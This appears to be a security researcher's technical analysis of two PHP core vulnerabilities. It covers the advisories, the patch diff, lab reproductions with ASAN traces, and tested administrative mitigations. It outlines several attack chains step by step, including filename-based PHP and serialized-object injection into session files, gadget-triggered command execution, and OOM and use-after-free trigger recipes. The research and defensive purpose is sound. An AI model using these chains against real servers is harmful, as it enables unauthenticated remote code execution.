# php2shell — Full Technical Analysis

## CVE-2026-109618 / CVE-2026-109619
**Author:** Qi Deng  **Date:** 2026-10-21 (updated after official release, 14:00 UTC)

---

## 0. Official Advisory Summary (2026-10-21, 14:00 UTC)

The official advisories establish the actual root causes. Both CVEs are
**memory-safety vulnerabilities in PHP core**, CVSS v4.0 9.2
(`CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H`), fixed in
8.2.35 / 8.3.36 / 8.4.27 / 8.5.12.

### CVE-2026-109618 — RCE via OOM corruption
[GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)

PHP uses `longjmp()` for OOM errors. In contexts where request memory is
reachable before full initialization, a failed allocation (any allocation —
it need not be related) exits early, leaving invalid state that request
shutdown then reads or branches on.

OOM trigger vectors (all within apparent PHP limits):
- multipart request **without usable Content-Length** passes `post_max_size`
- **unrestricted headers per part** — in-memory representation vastly
  exceeds wire size (part header count is not bounded)
- empty file controls don't count against `max_file_uploads` but create
  metadata arrays; nested field names multiply the work

SASP susceptibility:
- **mod_php:** request shutdown runs unconditionally, even after failed
  startup → **confirmed complete pre-app RCE** (validated over HTTP,
  default settings, prefork multi-worker)
- **FPM:** child exits on startup failure (state not consumed), but OOM
  after normal startup is source-susceptible; *no complete FPM exploit
  demonstrated for this CVE*
- FrankenPHP analogous to mod_php (likely susceptible); LSAPI models FPM

Fix: removes `longjmp()` OOM → delayed graceful soft-OOM at next VM safe
point + immediate hard OOM via `_exit()` at a second threshold.

### CVE-2026-109619 — RCE via stale global state
[GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)

Worker-global state (error, session, object, extension) can point at
request-owned memory. A fatal error (parse failure, uncaught error,
`require` failure, **`Maximum execution time exceeded`**, or OOM) can skip
the matching reset; a post-shutdown diagnostic can also *repopulate* error
state after it was cleared. The request heap is then freed while the global
still refers to it. A subsequent request on the **same worker** consumes the
stale state before normal initialization.

Exploitation needs a **producer** (operation publishing request-owned state
globally) and a **consumer** (later operation reading/freeing/branching on
it before init). Two confirmed consumers:

1. **INI diagnostics before request init** — a warning/notice/deprecation
   during startup consumes stale error state. Reachable via
   `auto_detect_line_endings=1`, non-default `filter.default`, legacy
   `assert.*`/session settings, `mbstring.http_input`, `iconv.*`, invalid
   quantities, `open_basedir`-rejected paths, etc. **Hiding the diagnostic
   (`error_reporting`, `@`, `display_errors`) does NOT protect** — global
   state is touched before reporting is decided. mod_php: via `.htaccess` /
   `php_value` per-dir config (applied before `php_request_startup()`).
   FPM: only conditionally, via `PHP_VALUE`/`PHP_ADMIN_VALUE` env params sent
   by the frontend; pool values and `.user.ini` do NOT provide this early
   consumer.
2. **Session upload progress before normal init** — independent of the INI
   path; requires no diagnostic at all.

Confirmed cases:
- **PHP 8.5 `fatal_error_backtraces`** — backtrace state stored globally,
  reset always missed in shutdown. Basis of the confirmed mod_php exploit.
- **Session upload-progress lifecycle** — upload initializes request-owned
  session/decoder state before normal init; a fatal error after publication
  skips the reset; a later upload-progress op on the same worker consumes
  it. **mod_php: producer+fatal all during multipart startup (pre-app).
  FPM: state published during application execution post-startup, then
  upload progress as the early consumer** (works with normal dynamic pool,
  application-dependent).

**There is no complete generic configuration mitigation** (per advisory);
patching is the only complete fix. Partial: `fatal_error_backtraces=0`
(8.5), `session.upload_progress.enabled=0` administratively + full worker
restart, `pm.max_requests=1` (extreme), eliminate attacker-reachable
fatal errors/diagnostics.

### Relation to this repo's research chains

Our Chains A/B/C (below) are **session-handling weaknesses explored during
the same investigation.** They require additional application-level
conditions (LFI, reachable `unserialize()`, cross-directory handler
mismatch + loaded gadget class). The official CVE root causes are the
memory-safety paths described above; **correspondence between our chains
and the CVEs is not established.** Chain B (var_destroy UAF) and Chain C
(handler mismatch) overlap thematically with CVE-2026-109619's
session-upload-progress consumer path and stale-state lifecycle, and that
relationship is a research question, not a claim.

---

## 0.1 Patch Diff Analysis (8.2.34 → 8.2.35)

Sources diffed: `php-8.2.34` vs `php-8.2.35` (github.com/php/php-src).
~319 files, ~8.4k insertions excluding tests/NEWS. The core fix surface
matches the advisory exactly.

### CVE-2026-109618 — the OOM rework (`Zend/zend_alloc.c`, ~650 lines)

The patch replaces the `longjmp()`-on-OOM design wholesale:

- **Soft limit** — exceeding `memory_limit` no longer `longjmp()`s; it
  queues a *delayed* OOM error (`EG(delayed_oom)`, state
  `ZEND_OOM_STATE_PENDING`) with a persistent message, raised at the next
  **VM safe point** (`zend_handle_delayed_oom()` is checked in
  `zend_call_function`, interrupt handling, `sapi_handle_post`, etc.).
- **Hard limit** — new `heap->hard_limit` (default 200% of `memory_limit`,
  or `memory_limit + 1G`; tunable via new `memory_hard_limit_percent` INI
  entry). Reaching it calls `zend_mm_hard_limit_error()` → **`_exit(137)`**.
  No `longjmp()`, no shutdown, no state traversal — the worker dies.
- New `ZEND_MM_MAX_ALLOCS` env (testing) + `ZEND_HAS_OOM()` checks
  sprinkled through `php_variables.c`/`rfc1867.c` so multipart parsing
  bails cleanly instead of half-initializing structures.

This is exactly why the advisory says `RLIMIT_AS`/`RLIMIT_DATA` are
dangerous: they make `mmap()` fail *before* PHP's soft limit is reached,
recreating the vulnerable early-exit condition the patch removes.

### CVE-2026-109619 — the stale-state resets

- `php_request_shutdown()` now clears `PG(http_globals)[i]` to
  `ZVAL_UNDEF`, `clear_last_error()`, `EG(delayed_oom).state`, and — key
  consumer gate — **`PG(modules_activated) = 0`**.
- `Zend/zend_execute_API.c` gets an early executor-globals reset routine
  (comment: *"may be used by `zend_error_zstr_at` before init_executor"*)
  zeroing `EG(user_error_handler)`, error/exception handler stacks,
  `EG(errors)`, `EG(objects_store)` — i.e., the advisory's INI-diagnostic
  consumer path is closed by resetting the globals a pre-init diagnostic
  would otherwise consume stale.
- `php_request_startup()` now calls **`php_basic_early_rinit()`**
  (main/main.c) before `sapi_activate()` — early reset of request
  globals.

### The session-upload-progress fix (`ext/session/session.c`, and how it maps to our Chain C)

This is the most relevant part for this repo:

- New `PS(in_rfc1867_update)` flag (php_session.h). When
  `php_session_rfc1867_update()` runs (request startup, **before RINIT**),
  the new `php_session_unserialize_init()` / `php_session_serialize_init()`
  wrappers set **`incomplete_classes_only`** on the var(UN)serialize
  context — meaning objects decoded during an upload-progress session
  update are **forced to `__PHP_Incomplete_Class`**: no autoloading, no
  `__wakeup()`/`__unserialize()`, no destructors, written back unchanged.
- `php_session_rfc1867_callback()` now returns early if
  `PG(modules_activated)` — the body-parser path "do not run here as it
  corrupts the session" — and `MULTIPART_EVENT_START` now calls
  **`php_rinit_session_globals()`** *before* the progress struct exists
  (comment: "This runs before RINIT, so we need to clear these early").
- On `MULTIPART_EVENT_END`, `$_SESSION` (populated in
  incomplete-classes-only mode) is explicitly deleted from the symbol
  table.

**Interpretation — our Chain C against the official patch:**

1. The patch confirms the *consumer* role of upload progress in
   CVE-2026-109619 (session/decoder state reachable pre-init), matching
   our Chain C's RINIT-decode observation — the difference is that the
   official chain weaponizes *stale decoder state across requests*
   (UAF), not just a handler-mismatch logic bug.
2. **The `incomplete_classes_only` mode also hard-kills the
   handler-mismatch→`__destruct` primitive as a pre-RINIT path** (our
   Chain C reproducer used a cookie-triggered `session_start()` decode
   *after* class definitions, which is an application-level path and is
   *not* blocked by this patch — our Chain C demo targets the
   application-side decode, which is arguably why the config-mismatch
   chain (known since PHP Bug #71101, 2015) is treated as a separate,
   long-standing, config-dependent weakness).
3. The `var_destroy` `__destruct` reentry UAF (our Chain B) is adjacent
   to the `incomplete_classes_only` serializer hooks (both touch
   `ext/standard/var_unserializer.re`, which gains ~139 lines) but the
   patch does not add `BG(serialize_lock)` around the dtor walk — so our
   Chain B ASAN finding is **not directly fixed** by the 8.2.35 patch as
   far as this diff shows; it requires `unserialize()` reachability,
   which the advisory doesn't list as a CVE path.

**Open research question → RESOLVED by retest (2026-10-21, lab):** The
`php:8.2.35` official Docker image was not yet published at release time
(`php:8.2-fpm` still rolled 8.2.34), so `lab-8235/` builds PHP 8.2.35
from the official source tarball (minimal `--disable-all --enable-session
--enable-fpm` build, FPM+nginx, same webroot/`.user.ini` config mismatch
as the 8.2.34 lab; pool-level `php_admin_value` stands in for `php.ini`).
A/B retest results:

| Step | 8.2.34 | 8.2.35 (patched) |
|---|---|---|
| Filename payload stored raw in session file (`php_serialize`) | ✅ | ✅ **unchanged** |
| Handler-mismatch decode at `session_start()` (`php` handler) | ✅ fails w/ warning | ✅ **fails identically** |
| Injected object materialized as real `FileLogger` (not `__PHP_Incomplete_Class`) | ✅ | ✅ |
| `__destruct` executes; command output over HTTP | ✅ `uid=33(www-data)` | ✅ **`uid=33(www-data)` — RCE still fires** |

**Interpretation:** the `incomplete_classes_only` fix only guards the
**pre-RINIT upload-progress decode path** (`PS(in_rfc1867_update)`), which
is the CVE-2026-109619 consumer. Our Chain C triggers via the *application's
own* `session_start()` decode of a session file written in a different
serializer format — a path the CVE patches do not touch. The handler-
mismatch config weakness (PHP Bug #71101 lineage, documented in the PHP
manual as a serialize-handler caveat) **survives 8.2.35** and remains a
separate, config-dependent (two handlers sharing a save_path + a loaded
destruct gadget) deserialization risk — not one of the two CVEs.

**Pre-RINIT path check:** triggering the decode via the upload-progress
callback itself (`POST` with `PHP_SESSION_UPLOAD_PROGRESS` to the `php`
-handler dir) already failed to execute gadgets on 8.2.34 (class not yet
defined → `__PHP_Incomplete_Class`), and on 8.2.35 the
`incomplete_classes_only` mode additionally forces incomplete classes
during rfc1867 updates — so the pre-RINIT variant of Chain C is closed
by the patch, and only the `session_start()` variant persists.

**Suggested follow-up:** the surviving chain is a known-but-underappreciated
configuration risk; worth a note to the PHP docs/security team as a
hardening request (e.g. erroring on serialize-handler mismatch within a
request) rather than a CVE.

---

## 0.2 CVE-2026-109618 trigger reproduction (mod_php ASAN lab)

Lab: `lab-asan-modphp/` — Apache 2.4 prefork + PHP 8.2.34 built from
official source with ASAN/UBSan (`lab` notes: sanitizer runtimes must be
`LD_PRELOAD`ed into apache, and `a2enmod mpm_prefork` must run before php
module load). Defaults in effect: `memory_limit=128M`, `post_max_size=8M`.

POC: `poc/verify_cve_109618_oom.py` — a single multipart file part
carrying ~560,000 minimal per-part headers (`X%08x: v\r\n`, 9 bytes each;
~5.1MB wire). Per the GHSA: *"A multipart part can contain an
unrestricted number of headers. Representing these headers inside PHP can
use substantially more memory than their wire representation."*

Observed (2026-10-21):

```
Fatal error: Allowed memory size of 134217728 bytes exhausted
at /usr/src/php/Zend/zend_smart_str.c:164 (tried to allocate 256 bytes)
in Unknown on line 0
```

- Wire size ~5.1MB **passes the default `post_max_size=8M`** (advisory
  vector: "may pass the initial post_max_size check")
- The OOM lands **during request startup, before any application code**
  ("Unknown on line 0") — in the rfc1867 header parser
  (`smart_string_appends` via `multipart_buffer_headers`), exactly the
  "reachable before fully initialized" context the advisory describes
- On prefork mod_php, the request shutdown procedure then runs
  unconditionally after the failed startup

**Honest ceiling:** in this lab the shutdown handles the state cleanly —
no ASAN report, no crash, worker survives (verified). The
trigger/condition is reproduced; the shutdown **consumption of invalid
state → corruption → RCE** escalation is NOT reproduced (that requires
grooming the failing allocation into a state shape that shutdown
mis-handles; out of scope, consistent with the entire public record —
no working exploit for this CVE is public).

Calibration notes for reproduction: header count must keep wire size
under the target's `post_max_size` while the in-memory representation
(estrdup + smart_string + llist per header, ASAN-amplified) exceeds
`memory_limit`; the exact ratio depends on the build. Requests whose
wire size exceeds `post_max_size` are rejected early and do nothing.

---

## 0.3 CVE-2026-109618 stall-based UAF path arming (0x4148 methodology)

Public reference: Ahmed Sultan (0x4148),
https://0x4148.com/posts/php2shell-php-core-rce-cve-2026-109618-109619/
(repo: CVE-2026-109618-php2shell-lab). The author's PoC "proves the
vulnerable code path is reachable. It does not achieve a crash or code
execution. That requires a heap groom (spraying fake structures into
ZendMM's 320-byte slab bin) with build-specific symbol offsets."

Reproduced here against our FPM lab (nginx
`fastcgi_request_buffering off` — required, it forwards chunks as they
arrive; `session.upload_progress.min_freq` low; `cleanup=Off` so the
session file persists for reading):

POC: `poc/verify_stall_arming.py` — multipart upload with the file
data sent in two bursts separated by a stall exceeding
`upload_progress.min_freq`.

Mechanism (per writeup, confirmed observable):

```
1. burst 1  -> FILE_START/FILE_DATA cache raw zval* into session HashTable
              (session.c ~3292/3318)
2. stall    -> nothing arrives
3. burst 2  -> update() -> php_session_rfc1867_update() ->
              php_session_initialize() AGAIN ->
              old HashTable freed while cached zval* still point into it
4. burst-2 progress writes (bytes_processed/done, session.c ~3331-3332)
   go THROUGH the stale pointers into freed memory
```

**Arming signature observed** (session file, PHP 8.2.34 FPM lab):

```
upload_progress_x|a:5:{s:10:"start_time";i:1792600818;  <- session init (burst 1)
  ...
  i:0;a:7:{...
    s:10:"start_time";i:1792600820;                    <- per-file entry re-created
                                                          at burst 2 (+stall seconds):
                                                          php_session_initialize()
                                                          ran a SECOND time
    s:15:"bytes_processed";i:8192;                     <- counters RESET: first burst's
                                                          accounting lost in re-init
                                                          (8515 streamed, 8192 counted)
```

Both markers present => the re-init happened mid-upload => the old
HashTable was freed while the cached pointers still referred to it =>
the subsequent progress writes went through stale pointers into freed
memory. **The vulnerable path is armed from a plain network request,
unauthenticated, default config.**

**Honest ceiling (same as the author's own PoC):** under ZendMM the
freed pages stay mapped, so the stale writes are silent — no crash, no
ASAN report in this configuration, no RCE. Escalation to RCE requires
heap grooming into ZendMM's slab bins with build-specific offsets —
explicitly out of scope for this repo.

**Defense-in-depth note (from the writeup, worth repeating for
clients):** nginx's default `fastcgi_request_buffering on` buffers the
request body before forwarding to FPM, which flattens the stall — the
reaching of chunks as they arrive is a prerequisite of this trigger.
Our lab sets it `off` deliberately (matching real-world misconfigs
where streaming is enabled for large uploads / request-time logic).

Also note the public record has since moved: Calif's writeup and a
weaponized "PHP2Shell" tool combining both CVEs are now public
(2026-10-21), with confirmed pre-auth RCE against major applications.
The arming PoC here is reproducible research evidence, not a weapon;
the tool's existence does not change this repo's scope.

---

## 0.4 post_max_size handling of lengthless requests (per SAPI)

POC: `poc/verify_postmax_bypass.py` (against `lab-asan-modphp` :18082 and
the FPM lab's exposed FastCGI port :9000). Write-up step 1: "PHP compares
post_max_size with the declared Content-Length before automatic POST
parsing begins, but it does not enforce the same limit against the bytes
it actually consumes."

Observed (2026-10-21):

| Path | Delivered | Result |
|---|---|---|
| mod_php, chunked (no Content-Length) | 17 MB vs post_max_size=8M | **fully parsed** — POST count 1, FILES count 1 |
| mod_php, declared Content-Length | identical body | rejected: "POST Content-Length ... exceeds the limit" |
| PHP-FPM direct FastCGI, no CONTENT_LENGTH param | 131 MB body on FCGI_STDIN | **zero POST bytes parsed** |
| PHP-FPM direct FastCGI, CONTENT_LENGTH declared > 128M | identical body | rejected by the rfc1867 gate |

Root cause for the FPM boundary: `sapi/fpm/fpm/fpm_main.c`
`sapi_cgi_read_post()` clamps reads to the declared length
(`remaining = SG(request_info).content_length - SG(read_post_bytes)`) —
a lengthless FastCGI request delivers nothing to the parser. The same
holds through nginx (`fastcgi_request_buffering off` + chunked client
request → parsed nothing, 200 with empty $_POST).

**Interpretation:** the lengthless bypass is the Apache mod_php property
the advisory describes ("Apache can therefore pass a chunked HTTP/1.1
... request with no meaningful declared length"). FPM's CVE-2026-109618
exposure is instead the in-memory amplification producers whose WIRE
stays under post_max_size (§0.5). The rfc1867 gate itself checks only
the DECLARED length (`main/rfc1867.c` `rfc1867_post_handler`), which is
why nginx's default request buffering (de-chunk + pass the full length)
also neutralizes the lengthless vector for FPM frontends.

---

## 0.5 CVE-2026-109618 OOM producer #2: empty-filename nested-name expansion

POC: `poc/verify_empty_upload_expansion.py` (all three labs; nested-safe
probe at `lab/webroot/expand_probe.php`). Write-up: "An RFC1867
file-upload part with filename="" contains no file data, and PHP does
not count it toward max_file_uploads. PHP still creates all six
corresponding $_FILES entries ... When the form field name is nested
... One short empty-upload record expands into many native HashTables,
Buckets and string-key allocations. Hundreds of these records can occupy
more than the default 128 MiB PHP heap while their complete HTTP body
remains below the default 8 MiB post_max_size."

Observed (2026-10-21):

- **max_file_uploads bypass verified**: 40 empty-filename parts →
  `FILES count: 40` (default cap 20) — the parts are not counted.
- **`max_input_vars` does not apply to $_FILES registrations** (400+
  records parse fully; no "Input variables exceeded" fatal).
- **Wire vs heap**: ~800 records × depth 60 ≈ 200 KB wire — under the
  8M default post_max_size — while the parsed representation crosses
  memory_limit=128M during request startup.

Per-SAPI results (the GHSA's own branch table, verified):

| Target | Observed |
|---|---|
| mod_php 8.2.34 (:18082) | `Fatal error: Allowed memory size of 134217728 bytes exhausted at Zend/zend_hash.c:174 (tried to allocate 384 bytes) in Unknown on line 0` — OOM inside the hash-update path during variable registration, before any application code; **worker pool survives**, request shutdown runs unconditionally over the half-initialized state; no ASAN report with this ungroomed shape (honest ceiling: consumption→corruption→RCE not reproduced) |
| PHP-FPM 8.2.34 (:18080) | startup OOM (`in Unknown on line 0`, 20 KB hash-table allocation) delivered through nginx, then `WARNING: [pool www] child ... exited with code 70` (FPM_EXIT_SOFTWARE) + respawn — the process-exit branch; the invalid state dies with the worker |
| PHP-FPM 8.2.35 (:18081, patched) | heap growth stays **bounded** (parse bails early via the ZEND_HAS_OOM checks / body-part accounting: peak 20.9 MB @400 records, 48.2 MB @1600 — sublinear), no startup OOM, worker survives |

The mod_php variant lands the fatal in the same `_zend_hash_str_add_or_
update_i` neighborhood the write-up's stale-bucket analysis centers on —
closer to the CVE-2026-109618 mechanism than the earlier header-count
producer (§0.2), and it demonstrates the advisory's exact "wire under
post_max_size, heap over memory_limit" property on default settings.

---

## 0.6 CVE-2026-109619 chains — stale-state consumption reproduced with ASAN evidence

Labs: `lab-asan-fpm/` (:18084, PHP 8.2.34 FPM + ASAN/UBSan, one static
child) and `lab-asan-modphp/` in tracked-allocator mode
(`lab-asan-modphp/setup-109619.sh`).

**ASAN visibility requirement:** cross-request stale dereferences are
only observable when request allocations are real `malloc()`s freed at
request shutdown — i.e. `USE_ZEND_ALLOC=0` **and** `USE_TRACKED_ALLOC=1`
(`tracked_free_all()` at `zend_mm_shutdown`, silent=1 via
`CG(unclean_shutdown)` which `zend_bailout()` sets). Two lab gotchas
documented for reproduction:
- For FPM these must be in the **container environment** (the allocator
  mode is decided at module startup, which happens in the FPM master
  before pool `env[]` directives apply to forked children).
- For mod_php they must be exported in `/etc/apache2/envvars` + a full
  container restart. The tracked allocator still enforces memory_limit
  (its limit error reports `at file:0`), so the OOM producers remain
  available. Apache child stderr (and therefore ASAN output) goes to
  `/var/log/apache2/error.log`, not `docker logs`.

The ASAN FPM lab also enables the upstream debug prints in
`php_var_unserialize_init/destroy` (`[UAFDBG] INIT/DESTROY lock/level`)
so the publish/skip/consume sequence is directly observable.

### 0.6.1 FPM chain — stale `BG(unserialize)` consumed before Basic's RINIT

POC: `poc/verify_109619_fpm_chain.py`; producer endpoint
`lab/webroot/api/producer.php`.

Producer (the write-up's OOM producer): an application-level
`session_start()` mismatch-decode (phpMyAdmin-style reachable decode;
Chain-C conditions) under attacker-controlled memory pressure. The
6 MB attacker-grown session KEY (`zend_string_init` of everything before
the first pipe — grown via the upload-progress form value, which unlike
the filename is not capped by the ~5 KB multipart header limit) crosses
memory_limit INSIDE the decoder, after `php_var_unserialize_init()`
published the bookkeeping:

```
[A2] Fatal error: Allowed memory size of 134217728 bytes exhausted
     at file:0 (tried to allocate 6291704 bytes) in api/producer.php
[UAFDBG] INIT    lock=0 level=0        <- producer decode publishes (level 0->1)
                                    <- NO matching DESTROY: bailout skipped
                                       php_var_unserialize_destroy()
worker survives
[UAFDBG] INIT    lock=0 level=1        <- NEXT request's INIT sees level=1:
                                           php_var_unserialize_init() takes
                                           the STALE branch
==N==ERROR: AddressSanitizer: heap-use-after-free (READ of size 8)
    #0 php_var_unserialize          ext/standard/var_unserializer.c:849
    #1 ps_srlzr_decode_php_serialize ext/session/session.c:872
    #2 php_session_decode           ext/session/session.c:265
    #3 php_session_initialize       ext/session/session.c:480
    #4 php_session_rfc1867_update   ext/session/session.c:2981
    #5 php_session_rfc1867_callback ext/session/session.c:3120
    #6 rfc1867_post_handler         main/rfc1867.c:986
    ...
   #11 php_hash_environment          main/php_variables.c:792
   #12 php_request_startup          main/main.c:1820      <- BEFORE
       zend_activate_modules (main.c:1821) runs Basic's RINIT reset
freed by:
    #1 tracked_free_all             Zend/zend_alloc.c:2887
    #3 shutdown_memory_manager      Zend/zend_alloc.c:2789
    #4 php_request_shutdown         main/main.c:1928      <- the PRODUCER's
       request shutdown on the same worker
```

This is the write-up's FPM consumer verbatim: "The next multipart request
reaches Session upload progress before Basic's normal request
initialization. The stale nesting level makes php_var_unserialize_init()
treat the dangling pointer as an active nested decoder." The consumer is
the **upload-progress FILE_START decode** (POST parsing precedes module
activation), the freed region is the producer request's heap, and the
worker survives (halt_on_error=0).

**Sequencing requirement discovered during verification:** the consumer
must be the FIRST request after the producer on that worker — any
intermediate request's Basic RINIT (`memset(&BG(unserialize), 0, ...)`,
basic_functions.c:413) erases the stale state. The producer's failed
decode destroys its own session, so the consumer must carry a *different*
pre-built session to decode (the write-up's "Session record that we
previously built through HTTP requests").

### 0.6.2 mod_php chain — stale Session globals consumed by the END cleanup

POC: `poc/verify_109619_modphp_chain.py` (requires
`lab-asan-modphp/setup-109619.sh`).

Producer: ONE armed multipart request — `PHPSESSID` +
`PHP_SESSION_UPLOAD_PROGRESS` + a file part (FILE_START publishes
request-owned `PS(id)` / `PS(http_session_vars)` / decoder state during
multipart startup) followed by the §0.5 expansion records whose parse
OOMs (`in Unknown on line 0`) — all during request startup, before
module activation. `MULTIPART_EVENT_END` and Session's RSHUTDOWN are
skipped (`PG(modules_activated)==0` gates `zend_deactivate_modules()`),
the request shutdown still frees the heap (mod_php runs it
unconditionally), and the worker survives.

Consumer: multipart with `PHPSESSID` + `PHP_SESSION_UPLOAD_PROGRESS`,
**no file part** — reaches `MULTIPART_EVENT_END` without FILE_START:

```
==N==ERROR: AddressSanitizer: heap-use-after-free (READ of size 1)
    #0 php_session_initialize        ext/session/session.c:423
       ( if (!PS(id) || !ZSTR_VAL(PS(id))[0]) — the freed SID string )
    #1 php_session_rfc1867_cleanup  ext/session/session.c:2996
    #2 php_session_rfc1867_callback ext/session/session.c:3160
    #3 rfc1867_post_handler         main/rfc1867.c:1285
    ...
   #10 php_apache_request_ctor      sapi/apache2handler/sapi_apache2.c:548
   #11 php_handler                  sapi/apache2handler/sapi_apache2.c:666
0-byte-offset inside a 64-byte region freed by the ARMED request's
shutdown (tracked_free_all)
```

The write-up's mod_php consumer verbatim: "read freed Session ID ...
destroy freed Session value" (the `php_session_track_init()` dtor over
the stale `PS(http_session_vars)` is the second primitive in the same
path). Prefork runs several children, so the POC retries the consumer
until the poisoned worker answers.

### 0.6.3 Lab findings during reproduction (research notes)

1. **A fatal inside a delayed `__wakeup()` poisons `BG(serialize_lock)`.**
   8.2's `var_destroy()` performs the delayed wakeup calls inside
   `BG(serialize_lock)++ / --` brackets (var_unserializer.c ~256-276); a
   fatal inside `__wakeup()` skips the decrement, and the elevated
   `serialize_lock` survives the request — forcing the FRESH branch in
   every later `php_var_unserialize_init()` and thereby *blocking* the
   stale-unserialize-reuse consumer. The OOM producer (which fatals
   inside the parse, before any wakeup handling) does not touch
   serialize_lock and is the correct producer; an execution-time fatal
   via `__wakeup` is not. (This is its own stale-global-state instance —
   same family as CVE-2026-109619's producer list.)
2. **Multipart header reading caps the filename at ~5 KB**, so filename
   injections cannot carry large payloads; the upload-progress FORM
   value (an ordinary POST field) is the unbounded attacker-controlled
   input into session keys — used by the §0.6.1 producer to size the
   crossing allocation.
3. **`zend_hash_extend` on an uninitialized table defers the allocation**
   (only `nTableSize` is bumped; real_init allocates the minimum), so
   declared-element-count payloads (`O:N:"cls":HUGE:{`) do NOT produce a
   chosen large allocation mid-parse; memory pressure must be tuned
   against measured request baselines instead.

**Honest ceiling:** both chains reproduce the stale-state CONSUMPTION
with hard ASAN evidence (freed-by = the previous request's shutdown;
used-by = the upload-progress session path before RINIT). Weaponization
(heap grooming, reclaimed reference lists, negative `used_slots` slot
placement, build-specific offsets) remains out of scope, consistent
with the entire public record — no working exploit for these CVEs is
public.

---

## 0.7 Defender verification — administrative controls vs chain preconditions

Lab: `lab-defender/` (:18083, the SAME php:8.2.34 engine as the
vulnerable lab; only the ini instance differs). Controls applied via FPM
pool `php_admin_value` (which per-directory `.user.ini` cannot override)
and verified by firing each trigger: `poc/verify_defender.py`.

| Control | Precondition killed | Evidence (2026-10-21) |
|---|---|---|
| `session.upload_progress.enabled = 0` | the rfc1867 session callback path (Chains A/B/C injection, stall-arming writes, BOTH 109619 consumers — upload progress IS the consumer) | injection upload left **no session file at all** |
| `session.serialize_handler = php_serialize` (administrative) | Chain C's cross-directory mismatch | `/api/` resolves `handler=php_serialize` despite its `.user.ini` |
| `memory_limit = -1` | the CVE-2026-109618 OOM trigger (and the 109619 OOM interruptor) | expansion producer completes with no fatal — with the advisory's caveat: this removes PHP's memory cap entirely; partial, temporary mitigation only |

Interpretation: on this engine every reproduced chain loses a required
precondition under these controls. This does NOT replace the patch:
CVE-2026-109618 has non-OOM interruptors (and RLIMIT-style limits are
explicitly dangerous per the advisory), CVE-2026-109619 has other
producers/consumers (error state, INI diagnostics), and the advisory's
own recommendation stands: **patch now; these are temporary, partial
mitigations.**

---

## 1. Vulnerability Summary

Two critical vulnerabilities in PHP's `session.upload_progress` handler enable pre-authentication remote code execution on PHP 5.4.0 through 8.5.x.

| Bug | Root Cause | Impact |
|-----|-----------|--------|
| Session Fixation | `MULTIPART_EVENT_FORMDATA` accepts PHPSESSID from POST body ignoring `use_only_cookies` | Attacker controls session ID and file path |
| Filename Injection | `add_assoc_string_ex(*data->filename)` stores raw filename in session without validation | PHP code / serialized objects injected into session files |
| Serializer Leak | `PS(serializer)` not reset in `php_rshutdown_session_globals()` | Cross-request handler mismatch in FPM |
| var_destroy UAF | `i_zval_ptr_dtor` at line 310 fires `__destruct` without `BG(serialize_lock)` | Heap-use-after-free → arbitrary code execution |

## 2. Attack Chains

### Chain A: Session Injection + LFI → RCE

```
Conditions: upload_progress.enabled=On (default) + application has LFI
Complexity: Low | Reliability: 100%

1. POST multipart with PHP code in filename
2. rfc1867 handler stores filename as-is in session file  
3. include(session_file) → execute injected PHP → RCE
```

**Verified (lab):** `poc/verify_chain_a_lfi.py` — inject
`<?php echo 'CHAIN_A_123'; ?>` via filename, trigger `lab/webroot/lfi.php`
(`include($_GET['page'])`) on the session file → `CHAIN_A_123` executes
inside `include()`, marker returned over HTTP. Retested 2026-10-21:
**fires identically on patched 8.2.35** (the CVE patches do not touch
filename storage or application-level LFI).

Reproduction notes: use a *string literal* marker — a bareword constant
(`echo CHAIN_A_123;`) is an `Error` in PHP 8, and its fatal-error text
falsely matches a naive "marker present" check. Evidence must be the
marker appearing as *executed output* where the serialized stream was
cut (`s:N:"` followed immediately by the marker), not inside error text.

### Chain B: var_destroy UAF → RCE

```
Conditions: ability to call unserialize() with controlled data
Complexity: Medium | Reliability: ~60% (heap-dependent)

1. unserialize() payload with 2000+ entries → overflow VAR_ENTRIES_MAX (1018)
2. Duplicate key moves object to dtor list
3. var_destroy Phase 1: efree extension chunks
4. Phase 2: i_zval_ptr_dtor → __destruct (BG(serialize_lock)==0)
5. Inner unserialize('R:1500;') reuses outer var_hash → reads freed memory
6. Spray reclaims freed chunk → controlled pointer → handler overwrite → RCE
```

**Verified (lab, `lab-asan/`):** ASAN build of PHP 8.2.34
(`--enable-debug` + `-fsanitize=address,undefined`, `USE_ZEND_ALLOC=0`)
running `poc/verify_uaf_asan.php` reports:

```
ERROR: AddressSanitizer: heap-use-after-free — READ of size 8
    #0 php_var_unserialize  ext/standard/var_unserializer.c:850   (R:1500 backref read)
freed by:
    #3 var_destroy           ext/standard/var_unserializer.c:245   (phase-1 chunk free)
reached via:
    #13 var_destroy          ext/standard/var_unserializer.c:309   (i_zval_ptr_dtor → __destruct reentry)
```

(Line numbers 245/309/850 in this build; doc references 245/310/851 —
same code, one-line drift.) This confirms the reentry mechanism: the dtor
walk fires `__destruct` without `BG(serialize_lock)`, and the inner
`unserialize('R:N;')` reads the freed `var_hash` extension chunk.
Memory-corruption-to-RCE escalation (`/proc/self/mem` handler overwrite)
is **not** demonstrated here and is allocator-layout-specific work —
out of scope for this repo.

### Chain C: Handler Mismatch → `__destruct` → RCE

```
Conditions: target has directories with different session.serialize_handler
Complexity: Medium | Reliability: High

1. Upload to Dir A (php_serialize) — filename contains |O:CLASS:N:{PAYLOAD}
2. Upload to Dir B (php handler) with same SID
3. rfc1867 reads php_serialize session with php decoder
4. php decoder finds | in filename → splits → deserializes injected object
5. Trailing data → decode FAILURE
6. __destruct fires during PHP_VAR_UNSERIALIZE_DESTROY cleanup
7. POP gadget chain → RCE
```

**Key insight:** `__destruct` fires on BOTH success and failure paths of `var_destroy`. The decode FAILURE does NOT prevent exploitation.

**Verified (lab):** `poc/verify_rce_gadget.py` — fixed-benign-command `__destruct`
gadget → command output returned over HTTP on PHP 8.2.34 FPM. Reproduction
notes discovered during verification:

- The gadget class **must be defined in the consuming script** (or autoloadable
  at decode time). Triggering with a request that carries a
  `PHP_SESSION_UPLOAD_PROGRESS` field causes decode at RINIT — *before* the
  script's classes exist — so the injected object materializes as
  `__PHP_Incomplete_Class` and the chain stops. Use a plain request with the
  SID in a cookie: decode then happens inside `session_start()`.
- Serialized class-name and property lengths must be exact
  (`O:10:"FileLogger"`), and quotes in the filename need rfc1867 backslash
  escaping (`\"`) to land verbatim in the session file.
